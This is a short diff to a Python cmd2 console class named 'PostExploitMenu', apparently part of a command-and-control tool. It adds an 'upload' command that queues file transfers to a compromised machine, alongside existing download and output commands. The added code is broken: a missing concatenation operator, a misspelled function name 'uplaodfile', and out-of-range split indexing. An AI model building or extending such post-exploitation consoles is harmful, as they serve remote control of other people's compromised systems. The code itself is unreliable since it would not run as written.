@@ -4,6 +4,7 @@ import cmd2_submenu
 from addcommand import editcommand
 from getoutput import getoutput
 from downloadfile import downloadfile
+from uploadfile import uploadfile
 
 class PostExploitMenu(cmd2.Cmd):
     POST_EXPLOIT_CATEGORY = 'Post Exploitation Commands'
@@ -39,6 +40,16 @@ class PostExploitMenu(cmd2.Cmd):
             self.poutput("[+] Successfully added command to the queue")
         else:
             self.poutput("[-] Error adding command to the queue")
+
+    @cmd2.with_category(POST_EXPLOIT_CATEGORY)
+    def do_upload(self, arg):
+        self.poutput("[*] Adding upload request to machine..." + arg.split(" ", 1)[0] + " " arg.split(" ", 1)[1] + arg.split(" ", 1)[2])
+        retValue = uplaodfile(arg.split(" ", 1)[0], arg.split(" ", 1)[1], arg.split(" ", 1)[2])
+
+        if (retValue):
+            self.poutput("[+] Successfully added command to the queue")
+        else:
+            self.poutput("[-] Error adding command tot he queue")
 
     @cmd2.with_category(POST_EXPLOIT_CATEGORY)
     def do_output(self, arg):
